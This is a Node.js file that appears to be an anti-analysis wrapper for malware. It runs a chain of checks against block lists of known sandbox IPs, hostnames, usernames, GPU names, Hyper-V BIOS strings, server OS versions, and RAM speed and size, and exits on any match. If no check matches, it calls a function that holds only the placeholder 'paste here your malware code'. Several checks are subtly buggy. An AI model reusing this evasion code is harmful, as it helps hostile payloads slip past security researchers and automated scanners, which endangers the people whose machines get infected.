const os = require("os");
var path = require('path');
const { exec } = require('child_process');

let blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
let blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
let blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
let blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
let blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]


var command = 'curl http://api.ipify.org/ --ssl-no-revoke'

function ipcheck(){
    child = exec(command, function(error, stdout, stderr){
        if(blackListedIPS.find(element => element === stdout)){
          process.exit(1);
          
        }else{
            mal()
        }
      
      
      
      })
}

// username check



var userName = process.env['USERPROFILE'].split(path.sep)[2];

if(blackListedUsername.find(element => element === userName)){
    process.exit(1);
    
  }else{  
    hostnamecheck()
    
  }


// hostname check


function hostnamecheck(){
    var hostName = os.hostname();
if(blackListedHostname.find(element => element === hostName)){
    process.exit(1);
    
  }else{
    bioscheck()
      

  }
}

// BIOS version check


function bioscheck() {
    exec('wmic bios get smbiosbiosversion', function(err, stdout, stderr) {
        if (stdout.includes("Hyper-V")) process.exit(1);
        else{
            speedcheck()
              
        
          }
    })
};



// speed ram check


function speedcheck() {
    exec('wmic MemoryChip get /format:list | find /i "Speed"', function(err, stdout, stderr) {
        if (stdout.includes("Speed=0")) process.exit(1);
        else{
            gpucheck()
              
        
          }
    })
};
// gpu check
function gpucheck(){
    exec('wmic path win32_VideoController get name', function(err, stdout, stderr) {
      const gpu1 = stdout.split("Name")
      const gpu2 = gpu1.toString().split("\r");
      const gpu3 = gpu2.toString().split("\n");
      //,,', ',,', ''
      const gpu4 = gpu3.toString().split(",,', ',,', ''");
      const gpu5 = gpu4.toString().split(",,,,,,");
      const gpu6 = gpu5.toString().split(",");
      const gpu7 = gpu6.toString().split(",                ,,,"); // lol
      const gpu8 = gpu7.toString().split(",,,")
      const gpu9 = gpu8.toString().split("  ")
      const gpu10 = gpu9.toString().split(",,")
      const gpu11 = gpu10.toString().replace(",", "")
      const gpu12 = gpu11.toString().replace(",", "")
      const gpu13 = gpu12.toString()



        if (gpu13.includes(blackListedGPU)) process.exit(1);
        else{
            oscheck()
              
        
          }
    })
}

// os check
function oscheck(){
  var command4 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName"
  child = exec(command4, function(error, stdout, stderr){
    var osp = stdout
    if(blacklistedOS.find(element => element === osp)){
      process.exit(1);
      
    }else{  
      ramcheck()
      
    }
  })


}
// ram size check
function ramcheck(){
  const totalRAM = os.totalmem();
  if(totalRAM > 1200){
    ipcheck()
  }
  else{
    process.exit(1);
  }
}
function mal(){
  console.log("paste here your malware code")
}